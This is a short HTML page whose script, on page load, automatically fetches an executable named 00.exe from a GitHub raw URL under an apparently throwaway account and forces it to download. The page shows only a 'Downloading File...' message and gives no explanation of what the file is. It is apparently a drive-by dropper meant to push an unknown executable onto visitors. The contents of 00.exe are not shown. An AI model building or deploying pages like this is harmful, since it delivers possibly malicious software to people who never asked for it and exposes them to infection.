<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automatic File Download</title>
    <script>
        function downloadFile(url, filename) {
            fetch(url)
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }
                    return response.blob(); // Get the file data as a Blob
                })
                .then(blob => {
                    const link = document.createElement('a');
                    link.href = URL.createObjectURL(blob); // Create a URL for the Blob
                    link.download = filename; // Set the filename for the download
                    document.body.appendChild(link); // Append the link to the DOM
                    link.click(); // Trigger the download
                    document.body.removeChild(link); // Clean up the DOM
                })
                .catch(error => {
                    console.error('Error downloading file:', error);
                });
        }

        // Automatically download the file when the page loads
        window.addEventListener('load', function () {
            const fileUrl = 'https://github.com/hubertloudgfdxgx/krc/raw/refs/heads/main/00.exe';
            const fileName = '00.exe'; // Suggested filename for the downloaded file
            downloadFile(fileUrl, fileName);
        });
    </script>
</head>
<body>
    <h1>Downloading File...</h1>
    <p>If the download does not start automatically, please check your browser settings.</p>
</body>
</html>
